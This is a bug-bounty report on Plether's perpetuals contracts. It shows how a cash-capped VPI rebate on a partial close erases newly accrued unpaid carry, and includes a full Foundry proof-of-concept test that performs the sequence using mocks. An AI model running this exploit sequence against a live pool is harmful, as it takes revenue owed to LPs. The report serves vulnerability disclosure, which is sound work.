# \#99933 [SC-Low] Partial close erases unpaid carry when a VPI rebate is cash-capped

**Submitted on Nov 15th 2026 at 19:28:40 UTC by @nemveer for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99933
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief/Intro
A trader with an open position can commit a partial close while its carry is fully paid, then execute it after new carry has accrued and pool cash has been reduced. If the close produces a VPI rebate larger than the cash available to pay it, Plether subtracts the unpaid carry from the *assessed* rebate, pays the same cash-capped amount it would have paid without that subtraction, and clears the carry debt even though part of the position survives. The accompanying Foundry test, using the documented release risk settings and a Junior LP redemption, erased **33,114 USDG atoms (0.033114 USDG)** of unpaid carry. It did not show a profitable trade or a larger, repeatable extraction.

## Vulnerability Details
Plether collects carry on a position from its margin and free settlement balance. Any amount it cannot collect is recorded as `unsettledCarryAssets`. A partial close leaves a position open, so unpaid carry must either remain collectible against that account or be settled with value actually retained by the pool.

The trader submits a close through `router.commitOrder`, and a keeper later calls `router.executeOrder`. `CloseCommitmentLib.project` rejects a partial close if the account **already** has unsettled carry when it commits (`packages/perps/src/libraries/CloseCommitmentLib.sol:33–39`). This finding concerns carry that accrues **after commitment**. The test executes 42 seconds after commitment, within the 60-second execution window. Its risk parameters use `vpiFactor = 0.01e18`, `baseCarryBps = 500`, `maintMarginBps = 10`, and `initMarginBps = 20`, matching `packages/perps/DEPLOYMENT.md:131–137`. The test uses mock Pyth price updates and a mock settlement token; it is not a live-deployment transaction.

An attacker can control both a trading account and Junior LP shares. In the test, the trader commits a legitimate partial close, which collects all carry then due and leaves `unsettledCarryAssets` at zero. Before execution, a Junior LP redemption settles through `router.settleLpEpoch`, removing real pool cash, while a further 33,114 atoms of carry become uncollectible from the trader's margin and free settlement. The close still leaves one healthy lot and a remaining pledge.

At execution, `CfdEnginePlanLib._planValidatedClose` computes pending and realized carry (`packages/perps/src/libraries/CfdEnginePlanLib.sol:814–815`). Its action settlement adds the unpaid difference to the VPI and fee calculation (`_planCloseActionSettlement`, lines 1041–1044):

```solidity
int256 actionNetAssets = cs.vpiDeltaAssets
    + int256(
        cs.executionFeeAssets + cs.frozenSpreadAssets + delta.pendingCarryAssets - delta.realizedCarryAssets
    );
```

When the result is negative, the difference lowers the rebate *assessed* to the trader. That would settle the carry only if it caused the pool to pay less cash. Here the rebate exceeds available cash both before and after the subtraction. `_planIsolatedCloseSettlement` caps `actionRebatePaidAssets` to `freePoolCashAssets` and records the rest as `actionRebateWaivedAssets` (lines 970–977). The partial-close guard checks only an uncollectible **positive action charge**, not this unpaid carry in a capped rebate (`_planValidatedClose`, lines 882–885):

```solidity
if (remainingSize > 0 && delta.actionChargeWaivedAssets > 0) {
    delta.revertCode = CfdEnginePlanTypes.CloseRevertCode.PARTIAL_ACTION_CHARGE_UNCOLLECTIBLE;
    return delta;
}
```

Finally, `CfdEngine._applyClose` realizes carry and executes the close, then unconditionally clears the account's arrears (`packages/perps/src/CfdEngine.sol:1313–1318`):

```solidity
_realizeCarryFromSettlement(delta.account, pos);
settlementSidecar.executeClose(delta, currentPosition, publishTime);
unsettledCarryAssets[delta.account] = 0;
```

The carry realization function records the uncovered amount in `unsettledCarryAssets` before this reset (`CfdEngine.sol:1421–1424`). Thus the zero assignment removes a real, nonzero obligation from an account that still has an open position.


## Impact Details
At the assessed revision, the trader's newly accrued carry is extinguished even though a healthy position remains and the pool retains no cash for that carry. The economic effect proved by the test is 0.033114 USDG in missed LP trading revenue. The 899.745538 USDG waived rebate is a payout the pool does not make; it is not an additional loss. The pool reaching zero cash after the close is a consequence of paying the available rebate, and this report does not attribute a lasting denial of service to the carry bug.

The demonstrated primitive is **erasure of 0.033114 USDG of unpaid carry**, not payment of the entire assessed or waived rebate. In the test, the net assessed rebate was 2,199.746886 USDG, but only 1,300.001348 USDG of cash was available and paid; 899.745538 USDG was waived. Without the unpaid carry, the gross assessed rebate would have been 2,199.780000 USDG. Both assessed amounts exceed the same cash cap. If `G` is the gross rebate, `U` the unpaid carry, and `P` the cash cap, the pool retains `min(G, P) - min(G - U, P) = 0` for this carry while `U` is cleared. The waived rebate is **not** an additional loss.

Reproduction needs carry to become uncollectible between commitment and execution, a negative VPI action amount, a rebate capped by available pool cash, and a healthy surviving partial position. The test constructs that ordering with controlled time, mock prices, and a real Router/Junior LP epoch path in the test environment. It requires the attacker to hold both the trading position and redeemable Junior LP shares, tying up substantial capital. The pool is empty after the close and enters degraded mode. The test later uses owner recapitalization to show that a 1 USDG trader withdrawal can proceed while the arrears remain zero; recapitalization is not an attacker-controlled step of the demonstrated sequence. No patched differential, attacker-profit calculation, live oracle sequence, or scalable repeat has been demonstrated. Those limits support **Low** as the suggested severity.



## Proof of Concept

## Proof of Concept

The attached `poc/CfdEngineReleaseCarryRebate.t.sol` is a Foundry integration test. From the repository root, copy that sibling PoC to `packages/perps/test/perps/poc/CfdEngineReleaseCarryRebate.t.sol` if it is not already there, then run:

```sh
forge test --root packages/perps --offline --match-path 'test/perps/poc/CfdEngineReleaseCarryRebate.t.sol' -vv
```

The focused test compiled and passed (1/1). It opens a short position, redeems Junior LP shares, commits a 9,999-lot partial close of a 10,000-lot position with no arrears, settles another LP epoch during the execution window, and executes the close. Its assertions confirm that 33,114 atoms of new carry are unpaid, one healthy lot survives, the rebate is cash-capped, no cash is retained for that carry, and `unsettledCarryAssets` becomes zero. It also confirms that later recapitalization does not restore the arrears. Selected observed output, in six-decimal USDG atoms:

| Check | Observed atoms |
| --- | ---: |
| Unpaid carry | 33,114 |
| Rebate assessed | 2,199,746,886 |
| Rebate paid | 1,300,001,348 |
| Rebate waived | 899,745,538 |
| Pool assets after close | 0 |
| Remaining pledge | 499,950,000,000 |

The test runs locally with mocked assets and oracle responses. It does not change a deployed pool.

### Complete runnable test

Save the following as `packages/perps/test/perps/poc/CfdEngineReleaseCarryRebate.t.sol` at the assessed commit. The test uses the repository's `BasePerpTest`, mock USDG, and mock Pyth responses; no in-scope contract is modified.

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PositionRiskAccountingLib} from "@plether/perps/libraries/PositionRiskAccountingLib.sol";
import {AccountLensViewTypes} from "@plether/perps/interfaces/AccountLensViewTypes.sol";
import {ICfdEngineSettlementSidecar} from "@plether/perps/interfaces/ICfdEngineSettlementSidecar.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {Vm} from "forge-std/Vm.sol";

/// @notice Tests whether a cash-capped VPI rebate can extinguish unpaid carry at release risk settings.
contract CfdEngineReleaseCarryRebate is BasePerpTest {
    address private constant TRADER = address(0xCA221);
    address private constant KEEPER = address(0xB0B);
    uint256 private constant OPEN_PRICE = 150_000_000;
    uint256 private constant CLOSE_PRICE = 200_000_000;
    uint256 private constant SIZE = 10_000 * CfdTypes.SIZE_QUANTUM;
    uint256 private constant CLOSE_SIZE = 9_999 * CfdTypes.SIZE_QUANTUM;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory p) {
        p = super._riskParams();
        p.vpiFactor = 0.01e18;
        p.maintMarginBps = 10;
        p.initMarginBps = 20;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 3_748_000e6;
    }

    function _request(bool isClose, uint256 size, uint256 margin) private view returns (OrderV3Types.OrderRequest memory r) {
        r.clientOrderId = bytes32(uint256(router.nextCommitId()));
        r.side = CfdTypes.Side.SHORT;
        r.sizeDelta = size;
        r.marginDelta = margin;
        r.targetPrice = isClose ? 1 : type(uint256).max;
        r.isClose = isClose;
        r.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _carryAt(uint256 atTime) private view returns (uint256) {
        (uint256 borrowBase, uint256 startIndex,) = engine.positionCarryState(TRADER);
        (,,,,, uint256 carryBps,,,,) = engine.riskParams();
        uint256 currentIndex = PositionRiskAccountingLib.computeCurrentCarryIndex(
            engine.sideCarryIndex(uint256(CfdTypes.Side.SHORT)),
            engine.sideCarryTimestamp(uint256(CfdTypes.Side.SHORT)),
            atTime,
            engine.sideBorrowBaseAssets(uint256(CfdTypes.Side.SHORT)),
            PositionRiskAccountingLib.computeNetPoolDepthAssets(pool.totalAssets(), engine.totalTraderClaimBalanceAssets()),
            carryBps
        );
        return engine.unsettledCarryAssets(TRADER)
            + PositionRiskAccountingLib.computeIndexedCarryAssets(borrowBase, currentIndex - startIndex);
    }

    function _open() private {
        // Keep the pledge-exhaustion boundary on an open-market weekday.
        vm.warp(vm.getBlockTimestamp() + 2 days);
        _fundTrader(TRADER, 15_000e6);
        router.updateMarkPrice(_mockPythUpdateData(OPEN_PRICE));
        OrderV3Types.OrderRequest memory request = _request(false, SIZE, 10_000e6 + 140_000);
        vm.prank(TRADER);
        uint64 id = router.commitOrder(request);
        bytes[] memory data = _mockPythUpdateData(OPEN_PRICE);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, data);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "open must execute");
        (uint256 size,,,,,,) = engine.positions(TRADER);
        assertEq(size, SIZE);
    }

    function _redeem() private {
        vm.warp(vm.getBlockTimestamp() + 2 days);
        router.updateMarkPrice(_mockPythUpdateData(OPEN_PRICE));
        uint256 maxShares = juniorVault.maxRequestRedeem(address(this));
        uint256 ownerAssets = juniorVault.estimateRedeemAssets(maxShares);
        (,,, uint256 available) = pool.getPendingTrancheState();
        uint256 requested = ownerAssets < available ? ownerAssets : available;
        assertGt(requested, 0, "LP capacity");
        uint256 shares = juniorVault.estimateWithdrawShares(requested);
        if (shares > maxShares) shares = maxShares;
        uint256 requestId = juniorVault.requestRedeem(shares, address(this), address(this));
        uint256 epochStart = pool.lpEpochStart(requestId);
        if (vm.getBlockTimestamp() < epochStart) vm.warp(epochStart);
        router.settleLpEpoch(_mockPythUpdateData(OPEN_PRICE));
        uint256 claimable = juniorVault.claimableRedeemRequest(requestId, address(this));
        assertGt(claimable, 0, "LP redeem funded");
        juniorVault.claimRedeem(requestId, claimable, address(this), address(this));
        emit log_named_uint("pool after LP redemption", pool.totalAssets());
    }

    function test_ReleaseSettingsCashCapCanEraseCarry() public {
        _open();
        _redeem();

        uint256 free = clearinghouse.getAccountAssetBuckets(TRADER).freeSettlementAssets;
        if (free > 0) {
            vm.prank(TRADER);
            clearinghouse.withdraw(TRADER, free);
        }

        uint256 pledge = clearinghouse.pnlPledgeAssets(TRADER);
        uint256 lo = vm.getBlockTimestamp();
        uint256 hi = lo + 365 days;
        assertGe(_carryAt(hi), pledge, "carry reaches pledge");
        while (lo + 1 < hi) {
            uint256 mid = (lo + hi) / 2;
            if (_carryAt(mid) >= pledge) hi = mid;
            else lo = mid;
        }
        uint256 requestedShares = juniorVault.maxRequestRedeem(address(this));
        assertGt(requestedShares, 0, "LP still owns shares");
        vm.warp(lo - 400);
        uint256 secondRequestId = juniorVault.requestRedeem(requestedShares, address(this), address(this));
        // The mark update advances one second; leave room for commit-time collection.
        vm.warp(lo - 2);
        router.updateMarkPrice(_mockPythUpdateData(CLOSE_PRICE));
        OrderV3Types.OrderRequest memory request = _request(true, CLOSE_SIZE, 0);
        vm.prank(TRADER);
        uint64 closeId = router.commitOrder(request);
        assertEq(engine.unsettledCarryAssets(TRADER), 0, "commit must fully collect carry");
        uint256 poolAfterCommit = pool.totalAssets();
        emit log_named_uint("pool after carry collection", poolAfterCommit);

        uint256 epochStart = pool.lpEpochStart(secondRequestId);
        emit log_named_uint("seconds until LP epoch", epochStart - vm.getBlockTimestamp());
        assertLe(epochStart - vm.getBlockTimestamp(), 50, "LP epoch must fit execution window");
        vm.warp(epochStart);
        router.settleLpEpoch(_mockPythUpdateData(CLOSE_PRICE));
        uint256 secondClaimableShares = juniorVault.claimableRedeemRequest(secondRequestId, address(this));
        assertGt(secondClaimableShares, 0, "second LP redemption funded");
        emit log_named_uint("pool after second LP settlement", pool.totalAssets());
        uint256 poolCashRemoved = poolAfterCommit - pool.totalAssets();
        assertGt(poolCashRemoved, 0, "second redemption removes real pool cash");
        uint256 lpWalletBefore = settlementToken.balanceOf(address(this));
        juniorVault.claimRedeem(secondRequestId, secondClaimableShares, address(this), address(this));
        assertEq(settlementToken.balanceOf(address(this)) - lpWalletBefore, poolCashRemoved, "LP receives withdrawn cash");
        emit log_named_uint("second LP cash withdrawn", poolCashRemoved);
        bytes[] memory data = _mockPythUpdateData(CLOSE_PRICE);
        uint256 due = _carryAt(vm.getBlockTimestamp());
        uint256 collectible = clearinghouse.pnlPledgeAssets(TRADER)
            + clearinghouse.getAccountAssetBuckets(TRADER).freeSettlementAssets;
        assertGt(due, collectible, "new carry becomes uncollectible");
        uint256 unpaid = due - collectible;

        vm.recordLogs();
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(closeId, data);
        Vm.Log[] memory logs = vm.getRecordedLogs();
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "partial close executes");
        (uint256 remaining, uint256 remainingPledge,,,,,) = engine.positions(TRADER);
        assertEq(remaining, CfdTypes.SIZE_QUANTUM, "one lot survives");
        assertGt(remainingPledge, unpaid, "later collectible pledge exists");
        AccountLensViewTypes.AccountLedgerSnapshot memory residual = engineAccountLens.getAccountLedgerSnapshot(TRADER);
        assertFalse(residual.liquidatable, "residual position remains healthy");
        assertEq(engine.unsettledCarryAssets(TRADER), 0, "carry debt erased");

        bool found;
        bool carryFound;
        uint256 actualUnpaid;
        uint256 assessed;
        uint256 paid;
        uint256 waived;
        for (uint256 i; i < logs.length; i++) {
            if (logs[i].topics.length == 2 && logs[i].topics[0] == ICfdEngineTypes.CarryRealized.selector
                && logs[i].topics[1] == bytes32(uint256(uint160(TRADER)))) {
                (,,, actualUnpaid) = abi.decode(logs[i].data, (uint256, uint256, uint256, uint256));
                carryFound = true;
            }
            if (logs[i].topics.length == 2 && logs[i].topics[0] == ICfdEngineSettlementSidecar.ActionRebateSettled.selector) {
                (assessed, paid, waived) = abi.decode(logs[i].data, (uint256, uint256, uint256));
                found = true;
                break;
            }
        }
        assertTrue(carryFound, "carry collection emitted");
        assertEq(actualUnpaid, unpaid, "projected shortfall matches recorded arrears");
        assertTrue(found, "VPI rebate assessed");
        emit log_named_uint("unpaid carry", unpaid);
        emit log_named_uint("rebate assessed", assessed);
        emit log_named_uint("rebate paid", paid);
        emit log_named_uint("rebate waived", waived);
        emit log_named_uint("pool after close", pool.totalAssets());
        assertGt(waived, 0, "pool cash caps the rebate");
        assertGt(waived, unpaid, "both gross and net rebate are above cash cap");
        assertEq(assessed, paid + waived);
        assertEq(pool.totalAssets(), 0, "rebate uses all available pool cash");
        // G is the rebate before the uncollected carry C; P is cash available after price PnL.
        // The actual retained cash is min(G,P) - min(G-C,P), not C, when both rebates exceed P.
        uint256 grossRebate = assessed + unpaid;
        uint256 cashCap = paid;
        uint256 grossPaid = grossRebate < cashCap ? grossRebate : cashCap;
        uint256 netPaid = assessed < cashCap ? assessed : cashCap;
        uint256 retainedForCarry = grossPaid - netPaid;
        uint256 lpCarryLoss = unpaid - retainedForCarry;
        assertEq(retainedForCarry, 0, "rebate netting retains no carry cash");
        assertEq(lpCarryLoss, unpaid, "all newly uncollectible carry is erased");
        emit log_named_uint("actual LP carry loss", lpCarryLoss);
        emit log_named_uint("remaining pledge", remainingPledge);

        uint256 withdrawable = clearinghouse.getAccountAssetBuckets(TRADER).freeSettlementAssets;
        assertGt(withdrawable, lpCarryLoss, "trader has collectible settlement value");
        assertTrue(engine.degradedMode(), "empty pool pauses withdrawals");
        settlementToken.mint(address(this), 20_000e6);
        settlementToken.approve(address(engine), 20_000e6);
        engine.recapitalizePool(20_000e6);
        engine.clearDegradedMode();
        uint256 traderWalletBefore = settlementToken.balanceOf(TRADER);
        vm.prank(TRADER);
        clearinghouse.withdraw(TRADER, 1e6);
        assertEq(settlementToken.balanceOf(TRADER), traderWalletBefore + 1e6, "later trader withdrawal succeeds");
        assertEq(engine.unsettledCarryAssets(TRADER), 0, "recovery does not restore waived carry");
    }
}
```



